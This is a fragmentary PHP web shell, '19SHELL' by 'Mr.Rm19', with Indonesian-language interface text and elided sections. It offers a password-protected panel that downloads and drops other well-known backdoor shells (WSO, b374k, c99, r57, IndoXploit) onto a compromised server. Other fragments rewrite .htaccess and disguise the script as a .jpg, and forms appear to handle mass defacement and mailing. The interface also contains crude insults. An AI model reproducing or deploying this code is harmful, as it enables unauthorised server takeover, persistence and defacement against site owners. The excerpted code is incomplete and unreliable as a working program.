...
// Jangan ganti copyright kalo mau dihargai!!!!
// http://facebook.com/c0d3c0d3c0d3
error_reporting(0);
set_time_limit(0);
session_start();

$s57_paswot = "30f603fb63d24386b905d95ff41cab5e";//default password : ramdan19

$alert="<script>
window.location.href='?45=".$_GET['act']."';
</script>";
@define('judul', '19SHELL - BY Mr.Rm19');
@define('icons', 'https://cdn-cms.f-static.com/uploads/732031/800_59f4de130b999.jpg');
@define('icon_folder','<img src="https://cdn-cms.f-static.com/uploads/732031/800_59f4de130b999.jpg'.'https://cdn-cms.f-static.com/uploads/732031/800_59f4de130b999.jpg'.'https://cdn-cms.f-static.com/uploads/732031/800_59f4de130b999.jpg');
@define('icon_file','<img src="https://cdn-cms.f-static.com/uploads/732031/800_59f4de130b999.jpg');
...
<tr><td colspan=2><h1 style="color:red;text-shadow:2px 3px 5px #fff;"><center>[ 19Shell BY Mr.Rm19]</h1><br><font color=white> <center>"WELCOME <b>'.$_SERVER['REMOTE_ADDR'].'</b> TO 19 shell at '.$_SERVER['HTTP_HOST'].' "</font></td></tr>
<tr><td><font color=red size=5 face=courier new> Username :</font></td><td>
<input type="text" value="Mr.Rm19" title="you can\'t change this username." disabled></td></tr>
...
<footer style="bottom:0;left:0;position:fixed;color:#fff">powered by Mr.Rm19 </footer>
  </center> 
    ';
}    
    exit; 
...
<div id='right'>
<center>
--<[<a href="?act=<?php echo $d;?>&about=<?php echo $d;?>">19 SHELL</a>|<a href="?act=<?=$d;?>&theme=<?=$d;?>">THEMES</a>|<a href="?act=logout">LOGOUT</a>]--[
</center>
<br>
...
[<a href="?act=<?php echo $d;?>&kuchiyose=<?php echo $d;?>">tools pembantu </a>]
...
if(file_exists('19_adminer.php')){
	echo" done!! => <a href='19_adminer.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['adminer'],'19_adminer.php')){
			echo"done!! --> <a href='19_adminer.php' target='_blank'>click here..</a>";
		}else{
...
if(chmod($_GET['notw'],0777)){
	...
	window.location.href='?19=".$_GET['notw'];
}else{
	echo"
	<script>
	...
	if(file_exists('19_wso.php')){
	echo" done!! => <a href='19_wso.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['wso'],'19_wso.php')){
			echo"done!! --> <a href='19_wso.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	...
	if(file_exists('19_whmcs.php')){
	echo" done!! => <a href='19_whmcs.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['whmcs'],'19_whmcs.php')){
			echo"done!! --> <a href='19_whmcs.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
...
if(file_exists('19_b374k.php')){
	echo" done!! => <a href='19_b374k.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['bejak'],'19_b374k.php')){
			echo"done!! --> <a href='19_b374k.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	...
	$fp=fopen('.htaccess','a+');
	if(fwrite($fp,$isi)){
		if(rename($_SERVER['SCRIPT_FILENAME'],"19.jpg")){
			echo"
			<script>
			alert('berhasil anjing');
...
if(file_exists('19_b374k.php')){
	echo" done!! => <a href='19_terminal.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['terminal'],'19_terminal.php')){
			echo"done!! --> <a href='19_terminal.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
...
if(file_exists('19_pastebin.php')){
	echo" done!! => <a href='19_pastebin.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['pastebin'],'19_pastebin.php')){
			echo"done!! --> <a href='19_pastebin.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
...
if(file_exists('19_indoXploit_shell.php')){
	echo" done!! => <a href='19_indoXploit_shell.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['indoxploit_shell'],'19_indoxploit_shell.php')){
			echo"done!! --> <a href='19_indoxploit_shell.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
...
if(file_exists('19_andela.php')){
	echo" done!! => <a href='19_andela.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['andela'],'19_andela.php')){
			echo"done!! --> <a href='19_andela.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	...
	if(file_exists('19_1n73ction.php')){
	echo" done!! => <a href='19_1n73ction.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['injection'],'19_1n73ction.php')){
			echo"done!! --> <a href='19_1n73ction.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	...
	if(file_exists('19_sbh.php')){
	echo" done!! => <a href='19_sbh.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['sbh'],'19_sbh.php')){
			echo"done!! --> <a href='19_sbh.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	...
	if(file_exists('19_bh.php')){
	echo" done!! => <a href='19_bh.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['bh'],'19_bh.php')){
			echo"done!! --> <a href='19_bh.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	...
	if(file_exists('19_jkt48.php')){
	echo" done!! => <a href='19_jkt48.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['jkt48'],'19_jkt48.php')){
			echo"done!! --> <a href='19_jkt48.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	...
	if(file_exists('19_c99.php')){
	echo" done!! => <a href='19_c99.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['c99'],'19_c99.php')){
			echo"done!! --> <a href='19_c99.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
	...
	if(file_exists('19_r57.php')){
	echo" done!! => <a href='19_r57.php' target='_blank'>click here</a>";
	}else{
		if(kuchiyose($k['r57'],'19_r57.php')){
			echo"done!! --> <a href='19_r57.php' target='_blank'>click here..</a>";
		}else{
			echo" failed!! check your connection!";
		}
...
function urlExist($url)
{
  ...
  else
  {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Mr.Rm19</textarea><br>
...
$f = fopen('19~/.htaccess','w');
fwrite($f,$r);
echo "<br><center><b><i><a href=19~>TOUCH ME SENPAI</a></i></b></center>";
$usr=explode("\n",$_POST['user']);
foreach($usr as $uss)
{
 $us=trim($uss);
...
echo'<center>berhasil!! <a href="19~" target="_blank">touch me senpai..</a></center>';
}
...
//Dec0de
	...
	?>
<center>
<h2 style="font-family:courier;">19 SHELL <br>
<small style="border-bottom:1px solid #fff;"> Mr.Rm19</small></h2>
<img src="https://cdn-cms.f-static.com/uploads/732031/800_59f4de130b999.jpg" width="500" height="300">
<br>
<table>
<tr><td>Assalamualaikum Wr Wb</td><td>
<marquee scrollamount=5><i><b><font color=white>
   </marquee></td></tr></table>
<h3 style="text-shadow:2px 3px 3px #fff;"> 19 shell ~ Mr.Rm19</h3>
<p>Orang bijak menemukan kebijaksanaannya melalui kerasnya kehidupan<br> dan orang cerdas tidak suka copy paste anjing<br> <br> Mr.Rm19 adalah people indonesian , from bogor, Team : Bogor6etar! <br> team ini berdiri dari 2016 <br> dan Mr.Rm19 adalah player 2016 thanks you telah memakai shell saya :v <br> </p>
<pre>
facebook me >></font> [<a href='https://facebook.com/c0d3c0d3c0d3' target='_blank'>Mr.Rm19</a>] atau >> [<a href='https://shafou.com' target='_blank'>Gans</a>]
...
echo "failed";
	...
	<table border=1>
	<tr>
	<td>from :</td><td><input type='text' name='from' value='Mr.Rm19' ></td></tr>
...
<img src='https://cdn-cms.f-static.com/uploads/732031/800_59f4de130b999.jpg' width='100%' height='100%'>
</td></tr>
</table>
<br><br>
...
<form method="post">
<center>
<input type="text" name="depecer" style="width:500px" placeholder="nick hacker lu ">
<br>
<textarea name="url"  placeholder="http://ngentot lu anjing" style="width:500px;height:300px;"></textarea><br>
...
copyright &copy; <?php echo date('Y');?> | 19SHELL BY Mr.Rm19| <a href="http://facebook.com/c0d3c0d3c0d3"> facebook me clik here!</a>
</div>
</body>
</html>